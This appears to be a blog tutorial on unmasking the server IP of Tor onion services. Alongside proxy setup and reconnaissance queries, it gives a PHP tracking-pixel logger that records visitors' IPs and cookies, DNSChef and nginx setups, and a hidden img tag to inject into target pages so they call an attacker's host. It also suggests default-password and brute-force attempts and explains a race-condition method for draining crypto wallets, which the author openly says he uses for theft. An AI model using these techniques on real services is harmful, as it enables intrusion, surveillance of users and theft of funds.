---
id: ckb-b284c04241ca
title: Basic Onion Check
category: foundations-and-systems
format: article
language: en
tags: [anonymity, bash, burp-suite, networking, tls, web-security]
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.56
---

# Basic Onion Check

Before I get into the details, I should mention that we are not hacking the Tor network here. We are not breaking the security of the network or the software itself. Also bear in mind that this tutorial doesn’t cover all the ways to hack hidden services. Today, I’m focusing on simple steps that can reveal the IP address of the server hosting the hidden service — a basic check to identify potential issues with the service. Our aim is to verify, in a few simple steps, whether the administrator of a given service is professional and avoids making mistakes that could reveal the location of the server.

![Onion Hacking](onionhacking.webp)

Hacking sites on the Tor network that operate as hidden services in the onion domain is not difficult. In fact, it’s just as easy as hacking regular websites on the internet. After all, what is a website with an onion domain? It’s a regular website written in the same programming languages as any other. The only difference is that it is hosted on a Tor web server which only hosts the website via the Tor network. This means that its IP address is unknown and it can only be accessed via a Tor browser or a browser configured to use Tor proxy.

The same PHP, ASP, Ruby, etc. code will be underneath, as well as the same MySQL, MariaDB and PostgreSQL databases, web servers such as Nginx, Apache and Lighttpd, and configurations. Consequently, the same configuration and code errors will occur. Additionally, people who create hidden services such as drug markets, forums with illegal content and shops selling illegal products are generally not good programmers. They often create something just for the sake of quick profit without considering their own safety or that of their service users. Of course, this is not always the case. There are sites and shops that have been around for years that are really well made, and hacking them involves social engineering and the work of large law enforcement teams looking for a needle in a haystack. However, such well-orchestrated sites are few and far between, and widespread, free access to AI, coupled with the multi-million dollar success of illegal marketplaces, is tempting new amateur administrators to create more such sites in the hope of getting rich quick.

Why hack onion sites, and what should you focus on? This is a rather philosophical question in general; first, you have to ask yourself why you would want to hack anything. You can hack to check security and fix flaws, i.e. pentesting your own application or someone ordering a test. You can hack to become famous in the hacker community, regardless of the consequences; to make money by selling stolen data; to learn how to defend yourself; and so on. All of these reasons are intertwined with the terms white hat (ethical hacking, penetration testing), black hat (violating laws or ethical standards for malicious purposes) and grey hat (sometimes violating laws or ethical standards, but not usually with malicious intent).

But what about the onion? In general, I think that hacking illegal sites does not seem illegal. It’s a good training ground. In the process, you might be able to hack the site and hand over the data to law enforcement, helping them to shut down the cyber criminals and their illegal site.

In general, however, you might want to hack onion sites for the same reasons as normal sites. You might want to become famous by closing a well-known marketplace. Or maybe you want to be rich because you stole a wallet from a shop or accessed a server wallet. Or maybe you want to shut down a forum containing illegal material and help catch its creators. Or perhaps you want to practise on a live system because you’re bored of test instances and labs, but you don’t want to do anything illegal or mess up normal people’s sites straight away. Of course, these are all big simplifications and examples. After all, your hacking attempts could undo years of work by a three-letter agency. There will probably be as many arguments for and against as there are readers of this article. So perhaps let’s focus on the process itself.

I personally investigate onion sites for two reasons. The first is to compromise them and reveal the IP address of the server, so that I can pass on the detected vulnerabilities and location to the relevant authorities. If any agencies are looking for freelancers or full-time workers, I am available! The second is to steal cryptocurrencies and keep some for myself while giving the rest to public benefit institutions (I’m like a half-way Robin Hood).

Ultimately, there’s nothing quite as satisfying as a race condition and slowly and effectively depleting a market’s wallet to zero. Or is it just me who enjoys it? Pervert!

Some people conduct basic tests of drug marketplaces, for example, to ensure that they are safe, well configured and that the owners take their users and the security of their service seriously. Without discussing whether buying drugs online, on the Tor network or on the street is a good idea, anyone buying them would want to be sure that the source is safe. At least, technically speaking, regardless of the quality of the product.

How do you get started? You will need the same set of tools and knowledge that you use for regular penetration testing. The only difference is that you must route all traffic from your tools or the entire system through a Tor proxy, enabling your tools to communicate with the Tor network and query onion domains. Sometimes, you also need to add a few parameters to make the query appear as if it was sent from the Tor Browser. For example, you might need to add the appropriate user agent, or manipulate the query time, intervals, and quantity to bypass DDoS security measures.

All right, enough theorising — this is a guide, after all. So let’s start by clicking on something.

I won’t go into too much technical detail because I hope you already know the basics. If not, I recommend revisiting the labs and books, as attempting this without the necessary knowledge could result in injury ;)

## Configuration

There are four ways to connect to the Tor network and give your tools access to onion domains. I mean, there are probably more, but these are the ones I need for this article.

The first method involves using [Whonix Gateway](https://www.whonix.org/wiki/Whonix-Gateway). Download the virtual machine image from Whonix, import it, launch it and configure it. For your Kali virtual machine set up the Whonix internal network as a second network card. Once you have started the system, you can set a static IP address for this card in the settings according to the Whonix guidelines. This will give you two network cards that you can switch between depending on whether you want the system to be behind Tor or on the regular internet. For more details, please refer to the official Whonix documentation: [Anonymise Other Operating Systems](https://www.whonix.org/wiki/Other_Operating_Systems).

The second method is [Parrot Security](https://parrotsec.org/). As a hacker who reads my blog, you probably know what it is. Parrot is an alternative to Kali Linux. It has a built-in application called [AnonSurf](https://parrotsec.org/docs/tools/anonsurf/) that allows you to connect to the Tor network from within the system. The application even has a GUI, so you just click ‘Connect’ and your entire system is behind Tor.

The third method involves using Kali Linux with Tor installed and running. In this case, you would use the default Tor proxy at 127.0.0.1 and port 9050. To set this up, you first install Tor using the command `sudo apt install tor`, then start Tor using the command `sudo service tor start`, and finally add socks 127.0.0.1:9050 to every application you use. This solution is lightweight and straightforward, but unfortunately, not all hacking tools support Socks proxies.

The fourth method also uses Kali Linux, but employs a technology similar to AnonSurf from Parrot. This solution provides access to your favourite Kali features without the need for an additional virtual machine (useful if you have limited resources), while still operating fully behind Tor. When I looked for an alternative to AnonSurf from Parrot, I couldn’t find anything that worked or that I was satisfied with, so I wrote my own Python script. It’s called [Toryfikator](https://0ut3r.space/2025/04/06/toryfikator/) and you can download it [here](https://github.com/h0ek/toryfikator). It is very easy to use and I plan to add a GUI like the one in AnonSurf in the future. But for now, we’re hackers, so we use the console, right?

As you can see, you have several options to choose from.

Depending on whether you are torify the entire system or only using a proxy, run the tools either normally or with proxy parameters.

If you only want to use a proxy, here is an example for [Burp](https://portswigger.net/burp). In Burp, go to `User Options > Connection > SOCKS Proxy` and select the `Use SOCKS proxy` option. Enter 127.0.0.1 in the `SOCKS proxy host` field and 9050 in the `SOCKS proxy port` field. Then navigate to `Proxy > Options > Proxy listeners`. Configure the IP address and port that Burp is listening on. Tick the ‘Running’ box. Now Burp will be able to use Tor SOCKS and connect to onion domains. If you are torifying the whole system, you do not need to configure anything; just run Burp.

For Firefox, for browsing only, it is worth installing the [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) plugin and setup one profile for Tor socks, providing the IP address and port in the same way as for Burp.

Another example is cURL. Here is the command for using a SOCKS proxy with cURL:

```bash
curl --socks5-hostname 127.0.0.1:9050 http://example.onion
```

Most hacking and security testing tools have a proxy option. Check the tool’s documentation or run help/man to see which parameter to use. If a tool does not have this option, you can use [torsocks](https://github.com/dgoulet/torsocks). If the Tor service is running, enter the command `torsocks <COMMAND>` and it will be executed through the Tor network sock proxy.

Ready to hack? Well, don’t be surprised, because it’s going to be simple and boring.

## Content search

Start with the basics. Check the website’s content for original contet and search for it on Google. If the server is visible on the regular internet and its content has been indexed, you can quickly and easily locate the server. It is best to use Google Dorks for this.

```plaintext
intitle:"unique title"
"part of unique text"
"part of unique URL content" inurl:http
inurl:unique_picture_name.png
filetype:png "unique_picture.png"
allinurl: unique_phrase
```

## Source code

Careless programmers leave a lot of information in their code. This may include comments, descriptions of functions, plain text passwords, hints, configuration errors, other endpoints and references to external endpoints.

## Server Mods

Some web server mods, such as `mod_status` and `mod_info`, can leak the server’s IP address. Simply visit the following URLs: `example.onion/server-status` or `example.onion/server-info`. These modules are enabled by default in Apache. In Nginx, the `ngx_http_stub_status_module` and `ngx_http_dav_module` might be enabled, and you can find something interesting by visiting `example.onion/status` or `example.onion/webdav`.

## PHP

Sometimes, programmers leave behind useful debugging files, such as `info.php`. It is also worth checking whether `phpMyAdmin` is installed by going to `example.onion/phpmyadmin`. You could try a small brute-force attack or check the default passwords. For PostgreSQL, the username and password are both `postgres`.

## Server response

You can use various `curl` queries to check whether the server provides additional information in the prompt.

Most servers disable TRACE due to potential security risks, such as cross-site tracing attacks, but if it is enabled or misconfigured, sensitive information such as internal IP addresses, additional headers or server configuration details may be leaked.

```bash
curl -X TRACE --socks5-hostname 127.0.0.1:9050 exampleonion.onion
```

This command provides metadata about the resource, including the server type, software version, content type and other header details.

```bash
curl -I --socks5-hostname 127.0.0.1:9050 exampleonion.onion 
```

It scans HTTP headers for proxy-related metadata, such as ‘X-Forwarded-For’ or ‘Via’, which could unintentionally expose client IP addresses or internal proxy chains. This is useful for detecting misconfigured reverse proxies.

```bash
curl -s -D - --socks5-hostname 127.0.0.1:9050 http://example.onion | grep -i -E 'x-forwarded-for|via'
```

In verbose mode, the full request and response is shown, including headers and TLS negotiation (if HTTPS is used). This can reveal detailed server behaviour, extra headers, redirects and potential leaks in the server configuration. This is very useful for manually inspecting how the server responds.

```bash
curl -v --socks5-hostname 127.0.0.1:9050 http://example.onion/
```

## Metadata

Browse images and photos for metadata. If a seller has uploaded a photo of a new product and forgotten to remove the EXIF metadata, you can find out a lot of interesting information. GPS coordinates would be gold :)

## Favicon hash

One way to reveal a server’s IP address is to download its unique favicon. You can then search for this in publicly available tools based on the calculated hash, in order to verify whether a misconfigured server is revealing the same icon publicly.

Download the favicon:

```bash
curl -o favicon.ico https://example.onion/favicon.ico
```

Calculate its md5 and sha256 hash.

```bash
md5sum favicon.ico
sha256sum favicon.ico 
```

and check on [VirusTotal](https://www.virustotal.com/gui/home/search)

```bash
entity:url main_icon_md5:7197d8e4ebfb3e035a852b0f47e67455
```

or on [Censys](https://search.censys.io/)

```bash
services.http.response.favicons.md5_hash:7197d8e4ebfb3e035a852b0f47e67455
```

To verify the icon on [Shodan](https://www.shodan.io/), use the tool [favscan](https://blog.shodan.io/deep-dive-http-favicon/):

```bash
favscan example.onion
```

The tool will search for the icon on the website and calculate its MurmurHash3 used by Shodan.
Then check the calculated hash on Shodan:

```bash
http.favicon.hash:908044487
```

You can also use a cool website [FaviHash](https://www.favihash.com/).

## Upload form

If the website has an upload field or form for files, images or avatars (for forums), and allows you to upload files from a URL, you can upload something from your server and review the file request. If the admin hasn’t proxied the whole server, you will get the IP address because the server will make a request for that file and expose itself.

Create an image file on your server that can be accessed at `http://example.com/test.png`. Then, upload the file using the form on the Onion website. Then check the access log of the server on which you are hosting the file.

```bash
tail -f /var/log/nginx/access.log | grep "text.png"
or
tail -f /var/log/nginx/access.log | grep "text.png" | grep " 200 "
```

If the administrator has made a mistake, you will see the real IP address of the hidden service page. The same applies to other files, such as DOC or PDF.

## Tracking pixel

You can also create a tracking pixel. On your nginx server, create a file that will simulate an invisible 1x1 pixel. Call the file `avatar.php` and add the following content:

```php
<?php
// Function to get or create a unique user ID stored in a cookie
function getUserId() {
    if (isset($_COOKIE['uid'])) {
        return $_COOKIE['uid'];  // Return existing UID from cookie
    } else {
        $uid = bin2hex(random_bytes(8)); // Generate a random 16-char hex UID
        // Set cookie for 1 year, HttpOnly flag for security
        setcookie('uid', $uid, time() + 60*60*24*365, "/", "", false, true);
        return $uid;
    }
}

// Collect information about the visitor
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
$cookie = $_SERVER['HTTP_COOKIE'] ?? 'none';
$uid = getUserId();
$timestamp = date("Y-m-d H:i:s");

// Prepare log line with all info
$log_line = sprintf(
    "Time: %s | UID: %s | IP: %s | UA: %s | Lang: %s | Ref: %s | Cookie: %s\n",
    $timestamp, $uid, $ip_address, $user_agent, $accept_language, $referer, $cookie
);

// Append log line to the file (file_put_contents with FILE_APPEND mode)
file_put_contents('tracking_log.txt', $log_line, FILE_APPEND);

// Return a 1x1 transparent PNG pixel
header('Content-Type: image/png');
$image = imagecreatetruecolor(1, 1);
$transparent = imagecolorallocatealpha($image, 0, 0, 0, 127);
imagefill($image, 0, 0, $transparent);
imagepng($image);
imagedestroy($image);
?>
```

Now, in the upload form, enter the address of your fake image: `https://example.com/avatar`. Each time the image is displayed by a visitor to the site on which it has been uploaded, the details will be saved in the `tracking_log.txt` file on your server. Ensure that all files belong to the nginx user (or www-data, depending on your web server configuration) and that the `tracking_log.txt` file has write permission (`chmod 666 tracking_log.txt`). Unfortunately, you will probably not see the real IP address because every visitor uses the Tor browser; it will therefore always appear as 127.0.0.1. However, if the server is configured to be visible outside the Tor network, an IP address will appear.

## DNS

You can try forcing a hidden service to resolve a domain that you control and then monitor the DNS queries coming into your server. Install and run DNSChef. Next, launch it to respond only to a specific subdomain.

```bash
sudo dnschef --fakeip YOUR_PUBLIC_SERVER_IP --domain tracker.example.com --interface 0.0.0.0
```

All DNS queries for `tracker.example.com` will now respond with your IP address and `dnschef` will log them. Set up Nginx to serve a tracking image and create a virtual host.

```bash
sudo nano /etc/nginx/sites-available/tracker

server {
    listen 80;
    server_name tracker.example.com;

    access_log /var/log/nginx/tracker_access.log;
    error_log /var/log/nginx/tracker_error.log;

    location /avatar.png {
        root /var/www/tracker;
    }
}
```

Add your image to the `/var/www/tracker` folder. Inject the tracking image into the victim’s view. Add the following wherever you can upload or include HTML:

```bash
<img src="http://tracker.example.com/avatar.png" style="display:none;">
```

Observe DNS requests:

```bash
sudo tail -f /var/log/dnschef.log
```

## SSH fingerprint

If a hidden service has exposed SSH, you can sometimes find an IP address with the same signature, thereby revealing the location of the hidden service.

```bash
ssh <ONION_URL> -p 22 (or 8022, 8822, 2222, 8222 etc)
```

Copy the RSA key fingerprint and search for it on [Shodan](https://www.shodan.io/) or [ZoomEye](https://www.zoomeye.ai/). If you’re lucky, you might find the IP address of the server.

You can also use

```bash
torsocks ssh-keyscan -p 22 <ONION_URL>
```

## Race Condition

One thing I try to do when I come across a market, shop, exchange or any other financial service is to check for [race condition](https://portswigger.net/web-security/race-conditions) vulnerabilities. For this, you can use the [Burp](https://portswigger.net/burp/communitydownload) or [ZAP](https://www.zaproxy.org/) proxy. If the page has an option to pay out or withdraw some crypto, I test for logic flaws. For example, I load some funds into the market wallet and then try to withdraw them at the same time. I capture the withdrawal query in Burp and then execute it ten times at the same time for a specific amount. If the website is vulnerable, I can withdraw the same amount ten times. In short, if I have 10 USD on the market and withdraw this 10 USD ten times in the same second, I get 100 USD.

## Tools

The same tools used for regular hacking can be used here, e.g. [whatweb](https://github.com/urbanadventurer/WhatWeb) or [nikto](https://github.com/sullo/nikto) or [sqlmap](https://github.com/sqlmapproject/sqlmap).

Remember to manipulate the number of requests and the intervals between queries, as well as the user agent, in order to appear as a regular user rather than a robot, script or hacker.

## Summary

As you can see, these are simple and quick options for a basic check to see if the admin has barin. If you find basic errors, it means that if you spend more time, you will find even more. If you find any basic errors, it suggests that you will find more if you spend more time. If not, then maybe you can relax and buy your favourite joint after such a quick check.

Additionally, if you are hacking a website with some awful video and image content, it is worth enabling media loading blocking in the browser itself or in the [NoScript](https://noscript.net/) extension while browsing such a website. Alternatively, you can block media downloads in Burp and focus only on the code and functionality.

In addition, I have created a simple script that performs some of the basic checks described in this article. The script is called [Onionscout](https://github.com/h0ek/onionscout) and is still in the very early stages of development, but it may be useful to someone. I will write more about it once I have developed it a little more.

Good luck testing onion services!
